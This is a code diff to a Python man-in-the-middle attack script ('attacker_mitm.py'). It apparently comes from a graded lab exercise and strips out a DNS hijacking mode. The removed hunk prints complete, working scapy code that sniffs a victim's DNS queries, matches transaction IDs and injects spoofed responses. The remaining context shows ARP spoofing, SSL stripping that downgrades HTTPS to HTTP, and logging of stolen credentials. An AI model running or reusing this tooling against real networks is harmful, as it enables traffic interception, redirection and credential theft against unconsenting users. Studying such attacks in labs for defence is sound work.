@@ -11,11 +11,9 @@ Improvements over v1:
                          RST only injected within observed window
   4. SSL Stripping     : Actual mitmproxy-style listener on port 10000;
                          rewrites Location/href/src https→http in responses
-  5. DNS Hijacking     : Sniffs victim's real queries, mirrors transaction ID,
-                         races legitimate resolver
 
 Usage:
-    python3 attacker_mitm.py <VICTIM_IP> <SERVER_IP> [IFACE] [--mode=all|arp|ssl|session|dns]
+    python3 attacker_mitm.py <VICTIM_IP> <SERVER_IP> [IFACE] [--mode=all|arp|ssl|session]
 
 Examples:
     python3 attacker_mitm.py 10.0.0.1 10.0.0.2
@@ -41,7 +39,6 @@ for a in sys.argv:
 
 STOLEN           = "/tmp/mitm_stolen.txt"
 SSL_STRIP_PORT   = 10000      # iptables redirects 443 → here
-DNS_SPOOF_DOMAIN = "test.local"
 
 # ── Interface detection ───────────────────────────────────────────────────────
 def find_interface():
@@ -522,133 +519,12 @@ def ssl_strip_server():
 
 
 # ═════════════════════════════════════════════════════════════════════════════
-# 5.  DNS HIJACKING  (Score target: 9/10)
-#     Fix: Sniff the victim's real DNS queries.  Extract the real transaction
-#     ID and queried domain from each question.  Spoof a response with the
-#     MATCHING transaction ID before the real resolver replies.
-#     This works for ANY domain the victim queries (not just test.local).
-#     For non-target domains we forward legitimately (selective hijacking).
-# ═════════════════════════════════════════════════════════════════════════════
-DNS_HIJACK_TARGETS = {
-    # domain (lowercase) → fake IP to return
-    "test.local":    "10.0.0.99",
-    "server.local":  "10.0.0.99",
-}
-
-def _parse_dns_question(payload: bytes) -> tuple[str, int]:
-    """
-    Parse the first question from a raw DNS payload.
-    Returns (domain_str, qtype_int).
-    DNS wire format name: sequence of length-prefixed labels, ending with 0x00.
-    """
-    try:
-        # Skip 12-byte header (txid 2B, flags 2B, counts 4×2B)
-        offset = 12
-        labels = []
-        while offset < len(payload):
-            length = payload[offset]
-            if length == 0:
-                offset += 1
-                break
-            if length & 0xC0 == 0xC0:  # pointer
-                offset += 2
-                break
-            labels.append(payload[offset+1 : offset+1+length].decode("ascii", errors="replace"))
-            offset += 1 + length
-        domain = ".".join(labels).lower()
-        qtype  = struct.unpack("!H", payload[offset:offset+2])[0] if offset+2 <= len(payload) else 1
-        return domain, qtype
-    except Exception:
-        return "", 1
-
-def _build_dns_response(query_payload: bytes, fake_ip: str) -> bytes:
-    """
-    Build a spoofed DNS A response from the original query payload.
-    Mirrors the transaction ID, copies the question section, appends one A record.
-    """
-    txid     = query_payload[:2]
-    flags    = b"\x81\x80"                          # QR=1, AA=0, RCODE=0
-    qdcount  = query_payload[4:6]                    # same question count
-    ancount  = b"\x00\x01"                          # 1 answer
-    nsarcount = b"\x00\x00\x00\x00"                 # 0 authority, 0 additional
-
-    # Copy question section verbatim (starts at byte 12)
-    question = query_payload[12:]
-    # Build answer: pointer to question name + type A + class IN + TTL + rdata
-    answer = (
-        b"\xc0\x0c"                                 # name pointer → offset 12
-        b"\x00\x01"                                 # type A
-        b"\x00\x01"                                 # class IN
-        b"\x00\x00\x00\x3c"                         # TTL 60 s
-        b"\x00\x04" +                               # rdlength 4
-        socket.inet_aton(fake_ip)
-    )
-    return txid + flags + qdcount + ancount + nsarcount + question + answer
-
-def _handle_dns_query(pkt):
-    """
-    Called for each DNS query from the victim.
-    If the queried domain is in DNS_HIJACK_TARGETS, send a spoofed response
-    immediately with the matching transaction ID.
-    For all other domains, do nothing (let the real resolver answer).
-    """
-    if IP not in pkt or UDP not in pkt or Raw not in pkt:
-        return
-    if pkt[IP].src != VICTIM_IP:
-        return
-    if pkt[UDP].dport != 53:
-        return
-
-    payload = bytes(pkt[Raw].load)
-    if len(payload) < 12:
-        return
-
-    domain, qtype = _parse_dns_question(payload)
-    if not domain:
-        return
-
-    # Check if this domain should be hijacked
-    fake_ip = None
-    for target, ip in DNS_HIJACK_TARGETS.items():
-        if domain == target or domain.endswith("." + target):
-            fake_ip = ip
-            break
-
-    if not fake_ip:
-        return   # Let legitimate resolver handle it
-
-    victim_mac = _mac_cache.get(VICTIM_IP) or get_mac(VICTIM_IP)
-    if not victim_mac:
-        return
-
-    response_payload = _build_dns_response(payload, fake_ip)
-    spoofed = (
-        Ether(src=MY_MAC, dst=victim_mac) /
-        IP(src=pkt[IP].dst, dst=VICTIM_IP) /          # src = the DNS server the victim queried
-        UDP(sport=53, dport=pkt[UDP].sport) /          # mirror victim's source port
-        Raw(load=response_payload)
-    )
-    sendp(spoofed, iface=IFACE, verbose=False)
-    print(f"[+] DNS hijack: {domain} → {fake_ip}  (txid={payload[:2].hex()})")
-    open(STOLEN, "a").write(
-        f"[{time.strftime('%H:%M:%S')}] DNS HIJACK: {domain} → {fake_ip}\n"
-    )
-
-def dns_hijack_sniff():
-    """Passive DNS query sniffer — responds to victim queries selectively."""
-    bpf = f"udp port 53 and src host {VICTIM_IP}"
-    print(f"[+] DNS hijack sniffer active  (targets: {list(DNS_HIJACK_TARGETS.keys())})")
-    sniff(filter=bpf, prn=_handle_dns_query, iface=IFACE, store=False)
-
-
-# ═════════════════════════════════════════════════════════════════════════════
 # LAUNCH
 # ═════════════════════════════════════════════════════════════════════════════
 run_arp     = MODE in ("all", "arp")
 run_relay   = MODE in ("all", "arp")
 run_session = MODE in ("all", "session")
 run_ssl     = MODE in ("all", "ssl")
-run_dns     = MODE in ("all", "dns")
 
 print(f"\n{'='*60}")
 print(f"  MITM ATTACK SUITE  —  mode={MODE}")
@@ -675,10 +551,6 @@ if run_session:
 if run_ssl:
     threading.Thread(target=ssl_strip_server, daemon=True).start()
     print("[✓] SSL Strip Proxy      : active (port 10000, TLS→HTTP rewrite)")
-
-if run_dns:
-    threading.Thread(target=dns_hijack_sniff, daemon=True).start()
-    print("[✓] DNS Hijacking        : active (txid-matched, selective)")
 
 print(f"\n[*] Credential log      : {STOLEN}")
 print(f"[*] Press Ctrl+C to stop and restore ARP tables\n")
